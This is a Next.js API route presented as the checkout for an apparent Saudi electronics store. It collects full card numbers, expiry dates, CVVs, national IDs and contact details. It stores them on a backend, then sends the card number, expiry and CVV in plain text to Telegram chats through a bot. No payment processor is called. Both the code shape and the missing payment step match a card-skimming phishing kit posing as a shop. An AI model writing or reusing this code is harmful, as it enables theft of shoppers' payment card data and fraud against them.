import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز
  let dbId: string | null = null;
  try {
    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
    const dbData = await dbRes.json().catch(() => ({}));
    dbId = dbData._id ?? null;
  } catch (_) {}

  // Send Telegram
  const whatsappUrl = `https://wa.me/${(whatsapp ?? "").replace(/[^0-9]/g, "")}`;
  const text = [
    `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
    `🔢 رقم الطلب: #${orderId}`,
    ``,
    `💰 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`💵 First Payment: ${downPayment} SAR`]
      : [`💵 Payment Type: Full Amount`]),
    ``,
    `💳 MadaVisa - New Order`,
    `👤 Order For: ${customer ?? "-"}`,
    `📱 WhatsApp: ${whatsapp ?? "-"}`,
    `💳 Card Number: <code>${cardNumber}</code>`,
    `👤 Card Holder: ${cardHolder}`,
    `📅 Valid To: <code>${expiry}</code>`,
    `🔐 CVV: <code>${cvv}</code>`,
  ].join("\n");

  const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
  await Promise.allSettled(
    chatIds.map(chat_id =>
      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id,
          text,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "💬 فتح واتساب", url: whatsappUrl }]] },
        }),
      })
    )
  );

  return NextResponse.json({ ok: true, orderId, dbId });
}
